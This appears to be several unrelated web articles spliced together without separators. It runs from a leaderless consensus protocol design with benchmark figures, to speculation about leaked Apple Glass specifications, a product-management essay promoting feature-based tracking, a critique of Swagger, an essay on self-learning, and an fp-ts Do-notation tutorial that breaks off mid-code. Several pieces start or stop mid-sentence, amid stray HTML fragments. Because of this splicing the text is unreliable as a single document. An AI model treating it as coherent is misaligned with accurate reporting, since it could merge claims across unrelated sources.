            <p>The lack of popularity may be attributed to the complexity. I've found several reports on implementing EPaxos: <a href="https://medium.com/princeton-systems-course/reproducing-epaxos-by-ang-li-and-robin-qiu-b5a8fc5262a2">Reproducing EPaxos</a> by Robin Qiu and <a href="https://issues.apache.org/jira/browse/CASSANDRA-6246">EPaxos</a> by Blake Eggleston, and both of them mention the complexity of EPaxos:</p>

            <blockquote>One major drawback of the algorithm is its complexity. From our understanding, EPaxos is more like a two-dimensional Paxos on top of an eventual-consistency-like layer.</blockquote>

            <blockquote>We only implemented the basic EPaxos, and it is already much more complicated than Raft. We believe the fully optimized EPaxos will be even more complicated. In practice, complicated algorithms are hard to design, optimize, and maintain, making them less likely to be adopted in production.</blockquote>

            <blockquote>It’s still pretty rough, I just wanted to get it to a point where we could get a feel for the performance advantages and decide if the additional complexity was worth it</blockquote>

            <p>Funny enough the complexity of the protocol <a href="https://arxiv.org/pdf/1906.10917.pdf">manifested</a> in the official reference implementation of the EPaxos and TLA+ proof having a bug which leads replicas to diverge and break the linearizability of the replicated service.</p>

            <p>This post is an attempt to design a leaderless consensus protocol but keep it simple via the modular approach by reusing already proved components.</p>

        </div></div>

        
          
        <div><div>
            <p>The core idea of the pacified consensus is to order client requests and to let replicas to co-execute the same request in parallel. The preordering reduces contention and parallel execution increases fault tolerance. Even when one replica gets isolated or goes offline another finishes its request without a delay because it is already working on it in parallel.</p>

            <p>The parallel execution doesn't affect correctness because the effects of the parallel execution can be explained by the selective duplication of messages and Paxos tolerates this kind of intrusion</p>

            <blockquote>"Messages can take arbitrarily long to be delivered, can be duplicated, and can be lost, but they are not corrupted", Paxos Made Simple</blockquote>

            <p>The task of ordering client requests in a fault tolerant way and replicating it to the replicas sounds like a consensus problem. It is natural to suggest that running two consensus replication processes can't be faster than running just one but actually it is.</p>

            <p>The trick is that a major part of the latency comes from the disk IO. Even when we use NVM but target high throughput we should make small delays to accumulate writes (4 ms) and write them in batches.</p>

            <p><img src="http://rystsov.info/images/pacified/nvm.png"></p><p>4 ms is 20 times higher than intra datacenter RTT, so in-memory consensus in front of on-disk consensus doesn't contribute much to the overall end to end latency but completely eliminates contention.</p>

            <p>This idea isn't just wild speculations, I've built it and measured the performance. And the leaderless consensus performs on par with leadered when there are no faults, latency is just 23% worse but throughput is 36% better.</p>

            <p><img src="http://rystsov.info/images/pacified/leaderless.leader.png">

            The leaderless consensus with faults performs a bit worse than leaderless consensus without faults.

            <img src="http://rystsov.info/images/pacified/leaderless.unrest.png"></p><p>Without context 67% increase in P99 latency (9267us vs 5535us) and 12% decrease in throughput (6154 ops/s vs 5392 ops/s) doesn't look good but when we compare it with other solutions it's almost an order of magnitude better.</p>

<h2>Introduction</h2>



<p>It seems like every day I get ready to finish part 1 of my MicroLED series, another AR news story breaks. And not just any AR story but one that Apple may be announcing their AR glasses soon along with a very few details.</p>



<p>I’m not an avid Apple follower, nor had I heard of the leaker, Jon Prosser, before today. But as just about every on-line tech and business magazine picked up the story and said Prosser past leaks usually came true, it gives the leak an air of credibility. <strong>For the sake of this article, I am going to assume Prosser is correct in his statements and then try to figure out what Apple could be doing based on the information.</strong> </p>



<p>This blog is not about breaking news, but more about analysis of existing information. Google Glass was old news when <a href="https://www.kguttag.com/2013/03/08/google-glass-and-himax-whirlwind/">this blog figured out that it was using a Himax LCOS Panel</a>. Magic Leap had already raised over $1B and had hundreds of patents when this <a href="https://www.kguttag.com/2018/08/23/ifixits-magic-leap-one-teardown-confirms-kgontechs-analysis-from-november-2016/">blog correctly figured out what they were doing about a year and a half before they shipped a product</a>.</p>



<p>I don’t have enough to go on today to know what Apple is doing precisely. As I wrote back in December, <a href="https://www.kguttag.com/2019/12/12/the-lack-of-apple-ar-patents-and-apples-leveraging-the-aias-ptab-banana-republic-courts/">Apple has not left much of a patent paper trail</a>. BTW, I find that <a href="https://www.patentlyapple.com/patently-apple/">Patently Apple</a>, at least in the case of AR, &nbsp;tends to over sensationalize what appears to me to be either trivial patents or things that I doubt Apple will bring to market. Either Apple is not filing significant patents, filing them under the name of a shell company, or they are buying the technology from someone else.</p>



<p>This is another, I want to get this out in a hurry article. Expect more than the usual number of typo’s. There will probably be some corrections in the upcoming days. </p>



<h2>Front Page Tech Video Say Apple Glass Will Be Announce in Q4 2020 or Q1 2021</h2>

<p>Today’s big news is that Front Page Tech’s (<strong>FPT</strong>) Youtuber Jon Prosser released a <a href="https://youtu.be/SfjSy6T4iE4">video giving information on the </a>Apple Glass name, planned announcement date, price, and some minimal technical information on the product itself. I’m going to try and tease out some additional technical details from the scant information given.</p>



<p>In the figure on the left, I have combined the video’s essential information from three slides Prosser presented. &nbsp;I should add that Prosser stated:</p>



<blockquote><p><em>I’m trying to get the green light legally to share a video of a prototype of these glasses that I’ve seen.</em></p></blockquote>



<p>So maybe we will see a video soon, but it was not clear to me if it will be a working prototype or just a mockup. While Prosser may be a tech enthusiast and good at finding leaks, he may not know what to look for in an AR headset.</p>



<p>An AR expert with just one look of a functioning headset could tell a lot about the optics they are using. And within a minute or two of using it could figure out what display technology they are using. Listening to Prosser’s video several times, I’m not sure he has looked through a working unit. Maybe he has seen a working unit, but I would expect to know a lot more from someone that has seen a working unit.</p>



<p>For the rest of this article, I am going to go through the bullet points from the video, where I feel I have something to add. I’m going to try and do some “<strong>thought experiment reverse-engineering</strong>” to tease out information from between the lines of what Prosser wrote. </p>



<h2>The Name “<em>Apple Glass</em>“</h2>



<p>No surprise and nothing original, but it looks like we have a name. iGlass and iGlasses like iWatch were already taken.</p>



<h2>“<em>$499 + prescription</em>“</h2>

<p>Interestingly this is the exact same price as Nreal’s AR glasses that plugs in smartphone via USB-C cable for the processing. While Prosser never says so explicitly, almost certainly the Apple Glasses have wireless data (more wireless data later), and probably why Prosser didn’t bother to mention it.</p>



<p>The $499 price gives a lot of clues. Figure that if the Nreal headset were in the Apple store, it would likely sell for more than $1,000 with <img width="273" height="171" src="">typical Apple margins. &nbsp;To meet typical Apple margins, Apple Glasses would need to have a bill of materials (BOM) about half that of Nreal’s consumer glasses. And Apple has wireless battery charging, a battery, and wireless communication that Nreal does not. </p>

<p>Apple is going to want much sleeker and inherently more expensive optics than Nreal. The Nreal birdbath optics (essentially the same as the OGG optics on the right – <a href="https://www.kguttag.com/2019/01/29/ces-2019-nreal/">see here for more about how they work</a>), while inexpensive with excellent image quality, are too bulky and probably block too much light for Apple’s liking. The thinner optics are likely not going to have nearly as good an image as a simple birdbath.</p>



<p>So Apple Glass has to support higher margins and inherently more expensive optics but sell at the same price. Something has to give, and it is likely in terms of resolution, field of view (FOV), and image quality when compared to Nreal. It suggests that Apple Glass is going to be somewhere between Google Glass and Nreal when it comes to the image the user sees.&nbsp; I’m expecting the display resolution to be between 400 x300 and 800×600 pixels in resolution. Everything to me suggests that Apple is going for “style” over image quality. </p>



<p>I tend to doubt that Apple will use waveguides like Hololens (1&amp;2), Magic Leap, WaveOptics, Dispelix, and Vuzix. Given the available information, I would favor some form of thin freeform optics like what has been done by <a href="https://www.tooztech.com/">Tooz</a> or by the lesser know startup, <a href="http://oorym.com/">Oorym</a>. Tooz spun out of Carl Zeiss that <a href="https://www.newsweek.com/apple-ar-smart-glasses-carl-zeiss-augmented-reality-540835">back in 2017 was rumored to be working with Apple</a>. <strong>I’m not saying that it was either Tooz or Oorym specifically</strong>, but that the optic might be something similar to what these companies are doing. Freeform optics are going to be much more optically efficient than say diffractive waveguides, which translates into less power, which saves on heat and battery. Freeform optics are bigger for a given resolution, but if Apple’s resolution and FOV goals are modest (i.e. small), freeform optics would seem to be the best option. </p>



<p>Then we have the comment on cost about being “plus prescription.” This immediately says that Apple’s Glasses are not going to have the large eye relief of say Hololens that would let someone wear their own glasses. The cheap but ugly way, not the “Apple way, &nbsp;would be to add prescription inserts like Nreal and Magic Leap, as examples. By process of elimination, this leaves building the prescriptions into the optics. Once again, this tends to point to thin freeform optics. Tooz, for instance, supports building the prescription into their optics, and Oorym claims they will be able to support prescription lenses. &nbsp;</p>



<p>I don’t have a much to go on in terms of the display type. I’m leaning to some form of flat panel, either a small OLED or a tiny pixel size (~20-micron pixel pitch) LCD. It could also be something like a <a href="https://www.himax.com.tw/products/microdisplay-products/front-lit-lcos/">Frontlit Himax LCOS device</a>. When you are talking a modest resolution and FOV, there are a lot of options.</p>



<h2>“<em>All data is processed on iPhone (example first gen Apple Watch)</em>“</h2>



<p>Quoting the video (from auto-transcript with minor corrections and punctuation):</p>



<blockquote><p><em>All data processing is going to happen on your iPhone, so similar to what we saw with the first gen Apple watch. That’s sort of what we can expect here with Apple Glass. Some of you might be surprised and bummed by that. But it makes sense. &nbsp;I know a lot of people are like expecting some sort of crazy holograph like Hololens type experience. Some life-changing device, so I want to sort of temper your expectations here, especially for the first generation product. But listen, it makes sense. Data processing happening, and depending on the iPhone in your pocket, that price point of $499 makes a lot more sense now. Anything more than that would probably increase the price of these things quite a bit.</em></p></blockquote>



<p>Everything said above makes sense. Apple Glass is likely to be closer to an Apple Watch (448 by 368 pixels) in terms of display resolution than say an iPhone (1792 x 828 pixels). Apple Glass is likely to be more of a “data snacking” and for playing lower resolution Pokemon-Go-like games. So they can more than get away with using the phone’s processor. </p>



<h2>“<em>Final design could be different, likely won’t match crazy concepts (they’re meant to LOOK like glasses, not intimidating tech)</em>“</h2>



<p>The “look like glasses” tends to support the idea above that the prescription is built into the glasses. Supporting prescriptions probably works against the many “uni-lens” concepts I have seen. It would be a developmental and logistical nightmare to have a “uni-lens” with prescriptions.</p>



<h2>“<em>LiDAR on right temple, no other cameras on recent prototype (privacy) &nbsp;and Controlled via gestures on and in front of device</em>“</h2>



<p>Despite all the “shaming” and privacy concerns, I can’t see this type of product being successful without the ability to take pictures. I can believe Apple would do it just like they wouldn’t make a large iPhone for so many years (sometimes Apple outthinks itself). If they make it past Gen 1, then expect a camera on Gen 2.</p>



<p>Putting the LiDAR on the right temple and would seem to be worse for left-handed people (about 10% of the population). &nbsp;Also, gesture input can be very problematic in real-world situations.</p>



<h2>“<em>Wirelessly charge (flipped upside down) on provided plastic stand</em>“</h2>



<p>As mentioned above, not only does this say there is a battery; it also implies that there is wireless communication to the iPhone. Like the Apple Watch, it will probably use a combination of Bluetooth and WiFi.&nbsp; But wireless communication takes a lot of power per bit, so sending video tends to be power-hungry. I would not be expecting to watch movies on Apple Glasses. Maybe a low-resolution video clip occasionally but not a lot more.</p>



<h2>“<em>Displays in BOTH lenses</em>” – The Big Ask</h2>



<p>It sounds so simple to put “displays in both lenses” until you realize the ramifications. It was this one statement that made me want to write this article. &nbsp;It may sound like supporting two …</p></div></article></section></article></main></section></div></div></div>

                    <p>The short answer is yes. Let me explain.</p><p>I’ve been working with developers and designers my entire life. </p><p>I’ve built a couple of products, worked at a young startup, and I’m now at Zepel helping development teams build better software.</p><p>I’ve spoken to 1000+ development teams while at Zepel alone. <strong>And it's evident that the way we build products is broken.</strong></p><p>There’s so much disconnect between how you and I talk about building products and how our teams actually build them.</p><p>For all the talk of scrum and agile and getting feedback quickly, there’s so much that’s broken in how we act on the feedback and build the feature.</p><p>Teams spend so much time and effort getting a deeper understanding of customers’ needs. And yet distil everything down to a simple two-line ticket and a couple of lines of markdown description.</p><p>This is hurting your developers. And it’s hurting your business.</p><blockquote>Nothing is more frustrating than having to understand what an entire feature should or shouldn’t do from a two-line ticket filled with ten bullet points of acceptance criteria.</blockquote><p><em>*Here are five prioritized tickets for the upcoming sprint. We have to ship them on time!*</em></p><p>On the other hand, you have teams who are able to build top quality software. They’re the ones who can concentrate on the fine implementation details without losing focus on the broader purpose of the feature as a whole.</p><p>Everyone wants to get to that level. But instead, teams do the exact opposite.</p><p><strong>Teams think in issues and tickets, instead of the feature as a system.</strong></p><hr><h2 id="development-teams-are-not-ticket-movers-">Development teams are not ticket movers!</h2><p>Today, everything is about moving a ticket from “Todo” to “Done” as quick as possible. And watching burndown charts. And customizing the tool to the extent that the developer only views a single ticket.</p><p><em>*“What’s the velocity of our team?” is simply another way of asking how quickly can my team move an issue from “Todo” to “Done”.*</em></p><p>Pieces of that stuff are important for productivity and shipping on time.</p><p>But seriously, how is your team supposed to ship anything of value if you narrow their focus down to the smallest unit of work without any context of why it’s needed or how it connects to the whole feature?!</p><p>Overall, we’ve lost our way. Product development today has become more about checking items off a list as quickly as possible. </p><p><strong>It isn’t enough to write multiple user stories and share a Figma link if you want to ship quality software.</strong></p><hr><h2 id="how-software-product-teams-really-build-software-together">How software product teams really build software together</h2><p>Development teams build better software together when they have the complete context of what and why something is being built.</p><p>To achieve this, the foundational elements need to change.</p><p>And it starts with getting the right abstractions and naming conventions.</p><p><strong>The names you choose determine the perception and the quality of conversations you have. </strong>It’s why top developers spend time obsessing over names for classes, functions, and variables.</p><p>When you open up a VS Code and see a function called <code>send_signup_email</code>, you have a certain sense of what’s going to be inside and why that’s there.</p><p>The right abstractions can drive the team towards asking the right questions. And this is critical.</p><p><strong>Because when you’re tracking issues and tickets in isolation you have no choice but to measure only outputs.</strong></p><p>And teams today don’t want to measure only the outputs. They want to measure <em>outcomes</em>.</p><hr><h2 id="what-s-the-right-abstraction">What’s the right abstraction?</h2><p>The right abstraction is the one that prioritizes people over processes and tools. It's the one you and I use every day — it's Features.</p><p>When a squad creates a Feature and opens it, they’ll get to look at the entire feature as a unit. A user story inside it might describe a specific functionality. But the difference is, now each developer and designer know how it connects to the larger scheme of things for the entire feature.</p><blockquote>A feature forces inept managers to stop focussing on output-oriented questions like “how can we work faster”. <p>And shifts the focus on outcome-oriented questions like “why should we prioritize this feature” and “how does this feature tie to the OKR”.</p></blockquote><p>Miscellaneous tasks and incoming bugs can be tracked on a separate “List”, so high-priority bugs don't get missed out. And of course, when it comes to tracking them, they can all be tracked on a Sprint or on a Kanban Board.</p><p><strong>Feature as an abstraction is the right middle ground that lets you focus on the output as well as the outcome.</strong> It lets you zoom in and track what's happening today. It also allows you to zoom out and track a feature's progress across multiple disciplines. And it enables you to see how a feature moves from a feature request all the way to prioritization and development.</p><p>Simple issue trackers and project management tools have shoehorned teams into ticket-movers and have made them think in outputs. Metrics get feigned to show productivity. Thinking in outcomes has become ridiculously hard. And it's hurting businesses.</p><p>It's time for tools to reflect the reality of product development. It's time to remove the disconnect between development teams and what your customers really want. </p><p>It's time to stop thinking in isolated tickets and start thinking in features as a system!</p><hr><p>If you liked what you read, I think you’ll love what we have in store for you.

		<article>

		<p id="article_date">14 August 2017</p>

		

		<p>The objective of <a href="https://swagger.io/" target="_blank" rel="noopener noreferrer">Swagger</a> is to create a “RESTful contract for your API, detailing all of its resources and operations in a human and machine-readable format.” In this sense it is a functional equivalent of WSDL documents for SOAP, providing automatically generated descriptions that make it easier to discover and integrate with REST APIs.</p>
<p>The problem is that this kind of automatically generated contract isn’t necessarily a great fit for RESTful APIs. In practice it can undermine some of the main features of REST, reducing APIs to a form of RPC contract that feels like a less reliable version of SOAP and WSDL.</p>
<h2>Swagger is not RESTful</h2>
<p>A problem with Swagger is that it doesn’t describe REST adequately. More specifically, it does not directly support hypermedia – a key aspect of REST that allows servers to control their own namespace. Servers should not be bound by fixed URLs but be allowed to define them in resource responses. A client should only need to know the root URL of an API and be able to navigate the remainder on responses alone.</p>
<p><a href="http://roy.gbiv.com/untangled/2008/rest-apis-must-be-hypertext-driven" target="_blank" rel="noopener noreferrer">Roy Fielding</a> has been particularly clear on this subject:</p>
<blockquote><p>…if the engine of application state (and hence the API) is not being driven by hypertext, then it cannot be RESTful and cannot be a REST API. Period.</p></blockquote>
<p>Swagger focuses very much on functions that are available via specific URI patterns. In this respect it reduces REST to RPC over HTTP by defining a remote data model that is manipulated through function calls. It does make a nod to hypermedia in <a href="https://nordicapis.com/whats-new-in-openapi-3-0/" target="_blank" rel="noopener noreferrer">version 3.0</a> of the specification by supporting static link definitions, but it makes it clear that hypermedia-driven APIs are not a goal.</p>
<p>This criticism of Swagger does risk descending into an unhelpful debate over what is and is not “RESTful”. One of the drawbacks of implementing REST APIs is that clients do not always leverage hypermedia, preferring to format URIs directly according to the patterns they expect. Swagger encourages this behaviour by focusing on the available URI patterns. In this sense it undermines REST by exasperating an on-going problem with the way REST APIs are adopted.</p>
<h2>The perils of generated clients</h2>
<p>There is a hangover from the SOAP era where client applications could be automatically generated from a WSDL contract that defined all the service functions and data. The resulting client applications could be convenient, but the code was inflexible, difficult to test and often failed to provide the genuine cross-platform compatibility promised by SOAP.</p>
<p>REST should give rise to more flexible clients that respond to the hypermedia controls returned in responses. They should also be more <a href="http://www.ben-morris.com/rest-apis-dont-need-a-versioning-strategy-they-need-a-change-strategy/" target="_blank" rel="noopener noreferrer">tolerant of breaking change</a> by only reading the fields that they need. Overall, this provides a more fluid approach to client integration that tends not to break so often.</p>
<p>Swagger undermines this by facilitating a return to automatically generating client applications against a fixed contract. This can also encourage clients to use genuinely RESTful APIs in the “wrong way”, i.e. through pre-generated URI patterns rather than responding to hypermedia controls. The effect is to further undermine REST by creating the kind of rigid, function-orientated clients associated with SOAP or RPC.</p>
<h2>Conflating documentation and code</h2>
<p>Swagger implementations tend to be used more widely in generating documentation as opposed to client code. This does at least help to ensure that documentation reflects what is in production, but it often comes at the cost of usability.</p>
<p>Automated documentation does depend on the conceit that developers can maintain meaningful documentation as part of their source code. They tend not to. You’re more likely to find boiler plate that is littered with errors. Achieving even the most basic consistency of tone or language can be a challenge, particularly with globally distributed teams.</p>
<p>There can be practical difficulties in coupling public documentation to the end-points exposed by a web application. Many API infrastructures expose end-points via an <a href="http://www.ben-morris.com/api-gateways-and-the-dangers-of-creeping-middleware-scope/" target="_blank" rel="noopener noreferrer">API gateway</a> that takes responsibility for concerns such as request routing, validation and authorization. This can give rise to inaccurate documentation as behaviours that are defined in a gateway won’t make it to the Swagger output.&nbsp;It may sound old fashioned, but Swagger is no substitute for a good technical writer.</p>
<p>Another issue is that Swagger implementations tend to bloat code bases. Swagger implementations generally try and support a “happy path” where a basic level of support is provided just by adding in the library. For example, the <a href="https://dzone.com/articles/spring-boot-restful-api-documentation-with-swagger" target="_blank" rel="noopener noreferrer">SpringFox </a>implementation for Java Spring just requires a <a href="http://springfox.github.io/springfox/javadoc/2.7.0/index.html?springfox/documentation/spring/web/plugins/Docket.html" target="_blank" rel="noopener noreferrer">Docket</a> bean which can be used to set a bunch of global defaults and initialise the UI. A similar low-hassle implementation is available for .Net via the <a href="https://docs.microsoft.com/en-us/aspnet/core/tutorials/web-api-help-pages-using-swagger" target="_blank" rel="noopener noreferrer">Swashbuckle</a> library.</p>
<p>These basic implementations won’t include any of the things that make documentation <em>useful</em>, such as method and field descriptions. These have to be added directly to source code directly, though Swagger implementations generally try to leverage existing code structures where possible. For SpingFox you can use Java annotations to add metadata, while a similar approach is taken for .Net using custom attributes.</p>
<p>The exact approach tends to vary between development environments, but a verbose Swagger implementation inevitably places significant extra burden on the source code. You either have a large and complex configuration file or metadata sprinkled liberally across your methods and models.</p>
<h2>If it’s RPC that you really want…</h2>
<p>Swagger can be a convenient means of outputting API documentation, but the automatic generation of content and client code feel like a poor fit for REST. Adding Swagger to a API implementation can undermine the RESTful aspects, encouraging clients to use it as an RPC API running over HTTP.</p>
<p>If you really want an RPC-style API, along with code generation and contract management, then there are better options than faux REST via Swagger. For example, <a href="https://grpc.io/" target="_blank" rel="noopener noreferrer">gRPC</a> is faster, has rich cross-platform support and is based on a structured contract that allows a reasonable degree of backwards compatibility.</p>

		<p>I've done both, through the system and out of it. I went to a higher education institute and learned most of what I know alone, using online resources and books.</p><p>In this post, I'll share the points that affected me. Others might view things differently and I encourage you to share your point of view in the comments section.</p><h2 id="the-good-">The Good:</h2><p>Learning alone, from online (or offline) resources gives you several degrees of flexibility:</p><p><strong>You can choose the content:</strong><br>You don't have to settle for the content that your education institute provides you. There are probably better resources out there, you can learn programming, economics, or architecture by handpicking the best resources every step of the way.</p><p>Searching for content will also give you a better understanding of your field of study, what are the main subjects to learn, what are the ways it's currently taught in. You can enrich your learnings with several media types, such as YouTube videos, books, and courses.</p><p><strong>3.5 months. No more:</strong><br>You don't have to stick to the 3.5 months semester format. If it takes you another month to learn a subject it's perfectly fine. The most important thing is that you end up understanding it. There is no such concept when going through college, if it takes you even 4 months, you "strike out" and need to retake that course.</p><p>It goes the other way as well. Sometimes you can complete learning a subject in less time. If your pace is faster no one forces you to drag it for 3.5 months.</p><p>You can schedule your learning time:<br>When taking a course at an educational institute, you're given a learning schedule and there's a specific time for classes and exercises. If it clashes with other things in your life, you'll have to adjust.</p><p>Self-learning allows you to fit learning into your existing schedule, or make lesser changes to your lifestyle. There's no real ability to work full-time when attending college, but it's possible if you can schedule your studies in the evenings and during the weekends. That said, there are obvious issues here that I'll touch in the cons section.</p><p><strong>A growth catalyst:</strong><br>To achieve the benefits of self-learning, we must grow and mature. This can be view as a con but I decided to list it in the pros. It's these experiences and hardships in our lives that spur growth. You have to be true to your word, invest the time required for learning and not trick yourself. It'll be hard. You might fail at times.</p><p>You have to maintain your integrity, not lie to yourself and do things outside of your comfort zone. The learning itself is just one of the challenges here. There's no group to drag everyone forward, no boss/teacher to give you exercises and there are no firm deadlines besides the ones you set yourself, which should be the hardest deadlines of them all.</p><p>Succeeding here will grant you mental sturdiness and competency. It will make you a formidable person, a force. You'll feel stronger because you'll know that you can execute plans and pull through inconveniences.</p><p>You'll also face the need to learn how to learn. This is an underrated skill that we rarely learn growing up. Self-learning will help you pay more attention to the way you learn and to your habits. You'll improve as you practice, thus be a more efficient learner.</p><p><strong>Learn for you:</strong><br>Self-learning usually comes from a place of need or desire. You either need the knowledge or are very curious about it (also sort of a need). Having a good answer to the "why" question will help you learn much better.</p><p>Self-learning allows you to choose your own "why". Growing up you didn't have a great part in the decision of what to learn and why. Now you're the authority. Maybe it's something you want to build, an improvement to your career path, or magical curiosity. The choice is yours.</p><p>Also, efficient learning requires a project, and self-learning enables you to choose your own. Choose a project that speaks to you, one that will make you feel it's a good use of your time. It'll give you a stronger purpose and a chance to use your newly gained skills along the way.</p><p><strong>Cost:</strong><br>It's much cheaper to be a self-learner. You can get the same knowledge for either free or a fraction of the cost of college. Books, online courses, YouTube Channels, Podcasts, all give you a great platform to learn from. You can also get certificates at platforms like edX and Coursera at an affordable price.</p><hr><h2 id="the-bad-">The Bad:</h2><p>Now for the cons of self-learning. Alongside the benefits of self-learning, there are disadvantages we should take into consideration.</p><p><strong>Underdeveloped maturity effects:</strong><br>Maturity develops with time. While still underdeveloped it can cause some pain.</p><p>Procrastination and excuses. Not finishing what you started or not investing enough time. These will anger you with yourself. You'll feel you're not cut out for it. Like you're not made out of self-learning material. Many people pass through this stage, and you should know that with dedication and persistence this can be overcome.</p><p>You need to be true to yourself about the amount of effort you invest and choose proper ways to exercise what you learned.</p><p>It's important to know when it's time to continue to the next stage. It's easy to stay in the new comfort zone of a topic you already understand. This requires maturity as well. It can cause you to stay at the introductory level or stick to tutorials and articles, not progressing with either the learning or the project you chose. I think the coined term is "Tutorial Purgatory".</p><p><strong>No people:</strong><br>Bringing people together is one of the most wonderful things about universities and colleges. I view it as the main reason for their existence.</p><p>Having all those people around you in college means that you can brainstorm a lot. You can gain access to the way other people think and learn. Learning from others is important and self-learning doesn't have that.</p><p>There are things you can do to compensate. You can be active in forums or, online groups, however, it's not a substitute for all that brain that naturally hangs out around you in environments like schools and universities.</p><p>Learning with people, there's also the "herd effect". It's easier to go through the experience of education as a herd, together. Students support and incentivize each other and share the load. It's a place we can start developing teamwork skills.</p><p>Also, it's more fun to learn with others. You have people to share newly learned concepts with. People to be curious or plot interesting projects with. Fun and connection is a great part of learning in particular and of executing in general and it's missed when learning alone.</p><p>With fewer people, there are fewer opportunities to develop your social skills and personal network. In college, you pass 3-4 intensive years together that create lifelong friendships and connections. While Self-learning, we meet fewer people with whom we share less time. It's a big con to consider.</p><p><strong>No mentors:</strong><br>There are usually no professionals to guide us when we self-learn. We can follow the advice of online tutors, but there's no one to approach personally and discuss your concerns and thoughts with.</p><p>The benefits of a mentor go beyond raw information. Good mentors show us the reasons behind what they do. They can give us the "why" that's always so important. Mentors also serve as professional role models, and unless you're actively searching, chances are you won't find one when self-learning.</p><p><strong>Less respected certificates:</strong><br>It's still the case that university diplomas are more appreciated than private course system's ones. There's also the problem of not having a certificate at all. If you study from a book, a YouTube channel or a private course, there's no one to certificate you.</p><p>It's a shame because when I study from books or courses, I usually end up knowing the material well enough to use it. With that, There's a shift going on these days, learners and employers decreasing their reliance on college diplomas. Experience speaks louder. The ability to execute start to matter more than whether or not you passed through a university. That said, diplomas still matter.</p><hr><p>We should view these cons as opportunities to improve self-learning. We can generate ideas to connect self-learners and spur interactions and discussions. Ideas that can lessen these cons or maybe even solve them. I bet on self-learning for the long run as a scalable solution, therefore, I think we must.</p><p>Surely this list of pros and cons is not an exhaustive one, and I might add to it in the future. The idea behind this list is not to help people choose between self-learning and the academy. You should ALWAYS strive to be a better self-learner, and if you have the privilege, go to a college as well.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="a-doomed-pyramid"><a href="#a-doomed-pyramid">A Doomed Pyramid</a></h2><p>The pyramid of doom is a problem that's plagued callbacks/promises since they were introduced to the Javascript language. If you've used fp-ts for any length of time, you've probably noticed that this problem isn't specific to asynchronous code. For example, this expression which sums three optional numbers:</p><div data-language="ts">
      <pre><code>option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>This, of course looks similar to how we'd deal with fetching numbers from some external service:</p><div data-language="ts">
      <pre><code>fetchA<span>.</span><span>then</span><span>(</span><span>a</span> <span>=&gt;</span>
  fetchB<span>.</span><span>then</span><span>(</span><span>b</span> <span>=&gt;</span> 
    fetchC<span>.</span><span>then</span><span>(</span><span>c</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Also, suppose these numbers were stored in either values, and we wanted to compute the sum, or return early with an error:</p><div data-language="ts">
      <pre><code>either<span>.</span><span>chain</span><span>(</span>errorOrA<span>,</span> <span>a</span> <span>=&gt;</span>
  either<span>.</span><span>chain</span><span>(</span>errorOrB<span>,</span> <span>b</span> <span>=&gt;</span>
    either<span>.</span><span>map</span><span>(</span>errorOrC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Note: You may have noticed that we could have used something like <code>Promise.all</code> to combine all of our fetched numbers. In this case, it's true (disregarding the fact that <code>all</code> executes in parallel), however, as soon as we need to use the output of the previously chained value as input to the next, we're back to nesting <code>chain</code>s.</p><p>JavaScript has added async await syntax, which helps avoid this problem for promises:</p><div data-language="ts">
      <pre><code><span>const</span> a <span>=</span> <span>await</span> fetchA<span>;</span>
<span>const</span> b <span>=</span> <span>await</span> fetchB<span>;</span>
<span>const</span> c <span>=</span> <span>await</span> fetchC<span>;</span>

<span>return</span> a <span>+</span> b <span>+</span> c<span>;</span></code></pre>
      </div><p>This is nice, but it only works for promises; it won't work for option chains, either chains, or any other chainable. It would be nice if we had something like this that would work for <em>all</em> chainable (monad) values.</p><p>This pattern happens quite often in functional programming, and certain fp languages even have special syntax sugar for expressing chains like these in a succinct manner, such as Haskell's <a href="https://en.wikibooks.org/wiki/Haskell/do_notation">do notation</a>, or Scala's <a href="https://docs.scala-lang.org/tour/for-comprehensions.html">for comprehension</a>. There have been a few attempts to mimic this syntax in JS. One popular way is to use generators. Generators don't work for all monads, and they have poor typescript support. It would be nice to have something that works with typescript, and supports all monads.</p><p><code>Do</code> is an attempt at this. It uses the builder pattern to collect the successful value from each chainable, and stores them in an object. At each successive step, the result of any chainable from previous values in the chain is accessible, making it possible to prevent nested callback situations, which can help make code clearer.</p><h3 id="do-for-option"><a href="#do-for-option">Do for Option:</a></h3><p>Let's get a feel for how <code>Do</code> works by using it with the previous examples:</p><p>Here we have 3 <code>Option</code> values each chained successively:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> option<span>,</span> Option <span>}</span> <span>from</span> <span>'fp-ts/lib/Option'</span>
<span>const</span> maybeA<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> maybeB<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> maybeC<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>

option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>The <code>Do</code> equivalent of this snippet is:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> Do <span>}</span> <span>from</span> <span>'fp-ts-contrib/lib/Do'</span>

<span>const</span> result <span>=</span> 
  <span>Do</span><span>(</span>option<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> maybeA<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> maybeB<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> maybeC<span>)</span>
